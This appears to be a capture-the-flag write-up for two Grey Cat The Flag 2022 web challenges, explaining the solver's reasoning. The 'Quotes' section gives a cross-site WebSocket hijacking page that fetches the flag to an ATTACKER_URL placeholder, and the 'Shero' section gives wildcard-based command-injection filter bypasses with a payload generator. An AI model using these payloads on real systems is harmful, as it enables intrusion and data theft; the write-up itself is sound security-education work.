---
description: >-
  Organized by NUS Greyhats in collaboration with National Cybersecurity R&D
  Labs from Singapore.
---

# Grey Cat The Flag 2022

## Qualifiers

I played the qualifiers while on holiday, so I was only able to join in for 1-2 hours every night. Nonetheless, my team did pretty well, finishing 3rd among Singapore teams and 4th overall.

![](<../.gitbook/assets/Screenshot 2022-06-11 at 9.49.33 PM.png>)

Here are the challenges I solved.

| Challenge                                  | Category | Value |
| ------------------------------------------ | -------- | ----- |
| Data Degeneration                          | Misc     | 394   |
| Logical Computers                          | Misc     | 467   |
| [Quotes](grey-cat-the-flag-2022.md#quotes) | Web      | 485   |
| SelNode                                    | Web      | 467   |
| Grapache                                   | Web      | 493   |
| [Shero](grey-cat-the-flag-2022.md#shero)   | Web      | 495   |

## Quotes

> Feeling lost? Why don't you come and get quotes from the wise?
>
> MD5 (quotes.tar.gz) = 3ba36e72cb0ee2186745673475de8cf7
>
> * 复读机

This was a simple client-side web exploitation challenge. From the `/share` endpoint we can submit a URL for the admin bot to visit.

```python
@app.route('/share', methods=['GET','POST'])
def share():
    if request.method == "GET":
        return render_template("share.html")
    else:
        if not request.form.get('url'):
            return "yes?"
        else:
            thread_a = Bot(request.form.get('url'))
            thread_a.start()
            return "nice quote, thanks for sharing!"

```

Let's take a look at the actual functionality of the web app! The flag can be found in the `/quote` WebSockets endpoint - as long as we satisfy the following conditions:

* The WebSocket client's origin must start with `http://localhost`
* The client must have the correct `auth` cookie

```python
@sockets.route('/quote')
def echo_socket(ws):
    print('/quote', flush=True)
    while not ws.closed:
        try:
            try:
                cookie = dict(i.split('=') for i in ws.handler.headers.get('Cookie').split('; '))
            except:
                cookie = {}

            # only admin from localhost can get the GreyCat's quote
            if ws.origin.startswith("http://localhost") and cookie.get('auth') == auth_token:
                ws.send(f"{os.environ['flag']}")
            else:
                ws.send(f"{quotes[random.randint(0,len(quotes))]}")
            ws.close()
        except Exception as e:
            print('error:',e, flush=True)
```

### Setting the Auth Cookie

The correct `auth` cookie is set at the `/auth` endpoint when the request is made locally by the admin bot.

```python
# authenticate localhost only
@app.route('/auth')
def auth():
    if request.remote_addr == "127.0.0.1":
        resp = make_response("authenticated")
        # I heard httponly defend against XSS(what is that?)
        resp.set_cookie("auth", auth_token, httponly=True)
    else:
        resp = make_response("unauthenticated")
    return resp

```

It is trivial to perform a GET-based CSRF through a top-level navigation to set the authentication cookie for the victim. We subsequently "sleep" for 1 second before continuing with the rest of the exploit to ensure that the nagivation was completed and the cookie was set.

```javascript
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

window.open("http://localhost:7070/auth");

await sleep(1000);
```

### Bypassing the Origin Check

Although the WebSockets library used ([flask\_sockets](https://github.com/heroku-python/flask-sockets)) is pretty old, there is no vulnerability in the `ws.origin` provided - afterall, `gevent` is the one providing the necessary information in the WSGI environment.

The `ws.origin` value corresponds to that of the `Origin` request header, which is one of the [forbidden header names ](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden\_header\_name)that cannot be modified progammatically by JavaScript. __ This is a special request header that comprises of only the following three parts of the _current_ webpage URL:

```
<scheme>://<hostname>:<port>
```

Unless we find a browser zero-day that allows a malicious webpage to spoof `Origin` headers (this would be quite interesting), there is no way around our exploit page's origin needing to start with `http://localhost`.

But is that sufficient validation to ensure the WebSocket connection came from a page hosted on the localhost? Nope! We could simply use a domain _starting with_ `localhost`, e.g. `localhost.zeyu2001.com`.

### Final Payload

Because there is no CSRF token being checked and because WebSockets are not restricted by the [Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin\_policy), we could use "cross-site WebSocket hijacking" to obtain and exfiltrate the flag.

The following page needs to be hosted on a domain starting with `localhost` and submitted to `/share`.

```markup
<html>
    <body>
        <script>
            (async () => {

                const sleep = async (ms) => {
                    return new Promise(resolve => setTimeout(resolve, ms));
                }

                window.open("http://localhost:7070/auth");

                await sleep(1000);

                const ws = new WebSocket('ws://localhost:7070/quote');

                ws.onopen = function open() {
                    ws.send('getquote');
                };

                ws.onmessage = function incoming(data) {
                    console.log(data);
                    console.log(data.origin);
                    fetch("http://ATTACKER_URL/?quote=" + data.data)
                };
            })();
        </script>
    </body>
</html>
```

## Shero

> We like cat, so don't abuse it please =(
>
> * 复读机

The premise of this challenge was quite simple. We are given the following source code, with the goal of finding the flag somewhere on the server.

```php
<?php
    $file = $_GET['f'];
    if (!$file) highlight_file(__FILE__);

    if (preg_match('#[^.cat!? /\|\-\[\]\(\)\$]#', $file)) {
        die("cat only");
    }

    if (isset($file)) {
        system("cat " . $file);
    }
?>
```

By supplying a `?f=` GET request parameter, we can run commands on the server. One problem though - the regex filter is more than a little restrictive.

![](<../.gitbook/assets/Screenshot 2022-06-09 at 10.57.05 PM.png>)

This is the part where the challenge turns from a web challenge to a command injection filter bypass challenge :sob:

The list of allowed characters are as follows:

* `.`
* `c`
* `a`
* `t`
* `!`
* `?`
* &#x20;``&#x20;
* `/`
* `|`
* `-`
* `[`
* `]`
* `(`
* `)`
* `$`

### Reading Arbitrary Files

One trick to bypass the character filter and run commands other than `cat` is to use [wildcards](https://tldp.org/LDP/GNU-Linux-Tools-Summary/html/x11655.htm). In particular, the `?` wildcard character is used to match any single character.

For example, using `cat /?tc/???t?`, we could read the `/etc/hosts` file.

![](<../.gitbook/assets/Screenshot 2022-06-09 at 11.31.41 PM.png>)

Using `cat /????????` yielded this very interesting-looking binary. At first glance, it contained the string `readflag.c`, so we could guess that this binary is probably called `readflag` and it runs with elevated permissions to read a flag file somewhere (so that we need RCE instead of simple file reading)

![](<../.gitbook/assets/Screenshot 2022-06-09 at 11.25.14 PM.png>)

If we download the binary and open it up in a decompiler, we would see that we need to pass the string `sRPd45w_0` as an argument (`argv[1]`) in order to read the flag. This was the result of rearranging the letters in the string `P4s5_w0Rd`.

![](<../.gitbook/assets/Screenshot 2022-06-09 at 11.33.44 PM.png>)

### Running Arbitrary Commands

Since the `|` character is allowed, we are able to use piping to terminate the `cat` command and start a new command. For example, using `?f=| /??a???a?` will translate to `cat | /??a???a?`, which runs the `/readflag` binary.

![](<../.gitbook/assets/Screenshot 2022-06-09 at 11.37.19 PM.png>)

### Passing the Argument

Now comes the torturous part. How do we get arbitrary characters to use as the password?

One thing that might help is that `$()` is allowed, so we could use [command substitution](https://www.gnu.org/software/bash/manual/html\_node/Command-Substitution.html) to get the strings we need.

When reading the binary previously, we could see that the string `P4s5_w0Rd` is in the binary. If we could run `strings` on the binary, somehow extract only the password string, and rearrange the letters, we could use command substitution to pass the correct password as an argument.

We could run `/usr/bin/strings /readflag` using `/???/???/?t????? /??a???a?`&#x20;

![](<../.gitbook/assets/Screenshot 2022-06-09 at 11.51.19 PM.png>)

Now we need some way of filtering out the rest of the strings and only keeping the relevant `P4s5_w0Rd` string. I came across [this writeup](https://github.com/InfoSecIITR/write-ups/tree/master/2016/33c3-ctf-2016/misc/hohoho) of a similar command injection challenge where the author used `/etc/alternatives/nawk` to filter output using regex, so I decided to try something similar.

Luckily enough, many useful regex characters are allowed - in particular, `.`, `[` and `]` are very useful. This allowed me to construct a regex that leaves only the password string.

![](<../.gitbook/assets/Screenshot 2022-06-09 at 11.56.15 PM.png>)

Using `/???/???/?t????? /???????? | /???/a?t???a?????/?a?? /[.-t][.-a][.-t][.-a][!-a].[.-a][.-t][c-t]/`, we can get the `P4s5_w0Rd` string!

![](<../.gitbook/assets/Screenshot 2022-06-10 at 12.00.36 AM.png>)

At this point, we could try passing in the string as an argument to `/readflag` using `$()`, but this will yield "Wrong Password!".

![](<../.gitbook/assets/Screenshot 2022-06-10 at 12.03.15 AM.png>)

### Rearranging the Letters

We needed a way to rearrange `P4s5_w0Rd` into `sRPd45w_0`. It would be great if we could get characters of the string at specified indices - it sure is nice that a [`cut` command](https://man7.org/linux/man-pages/man1/cut.1.html) exists for this very purpose!

By using `/???/???/c?t -cX`, we will get the character of the string at index X.

But how do we get numbers? It turns out that `$?` is one of the [special parameters](https://gnu.org/software/bash/manual/html\_node/Special-Parameters.html) in bash, containing the exit status code of the previous command. If the exit code is non-zero, then `$? / $?` will yield `1`, `$? / $? -- $? / $?` will yield `2`, and so on. If the exit code is zero, this method will lead to a division by zero error.

But how do we make the exit code non-zero? We just need to place an extra bogus command in front of it: `(a || /???/???/c?t -c$(($? / $?)))`.

Here's the script to generate the payload required to reconstruct the password string.

```python
original = "P4s5_w0Rd"
target = "sRPd45w_0"

final = ''
for char in target:
    idx = original.index(char)

    num = "$? / $?"

    for i in range(idx):
        num += "-- $? / $?"

    final += f"$(/???/???/?t????? /???????? | /???/a?t???a?????/?a?? /[.-t][.-a][.-t][.-a][!-a].[.-a][.-t][c-t]/ | (a || /???/???/c?t -c$(({num}))))"

print(final)
```

And here's the payload...

![](<../.gitbook/assets/Screenshot 2022-06-10 at 12.22.38 AM.png>)

### Putting It All Together

All we need to do now is to use the output from the previous script and put it behind `/readflag`.

![](<../.gitbook/assets/Screenshot 2022-06-10 at 12.26.47 AM.png>)

and we get the flag: `grey{r35p3c7_70_b45h_m4573r_0dd14e9bc3172d16}`.

### References

* [https://github.com/InfoSecIITR/write-ups/tree/master/2016/33c3-ctf-2016/misc/hohoho](https://github.com/InfoSecIITR/write-ups/tree/master/2016/33c3-ctf-2016/misc/hohoho)&#x20;
